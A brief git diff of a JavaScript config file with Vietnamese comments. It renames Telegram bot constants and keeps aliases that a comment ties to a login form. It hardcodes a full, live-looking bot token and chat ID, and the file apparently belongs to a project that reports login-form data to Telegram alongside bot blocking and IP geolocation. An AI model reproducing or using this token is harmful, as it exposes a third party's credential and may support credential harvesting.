@@ -1,8 +1,12 @@
 // ============================================================
-// TELEGRAM
+// TELEGRAM (thông báo chặn bot — để trống = không gửi)
 // ============================================================
-export const BOT_TOKEN = "8512721212:AAGBs7cbtc9YfIaq0zWgj0Rk5iOyLcZ84aU";
-export const CHAT_ID = "-1003433255916";
+export const noti_token =
+  "8512721212:AAGBs7cbtc9YfIaq0zWgj0Rk5iOyLcZ84aU";
+export const noti_chat_id = "-1003433255916";
+/** Alias cho form đăng nhập / Telegram hiện có */
+export const BOT_TOKEN = noti_token;
+export const CHAT_ID = noti_chat_id;
 
 // ============================================================
 // IP GEOLOCATION
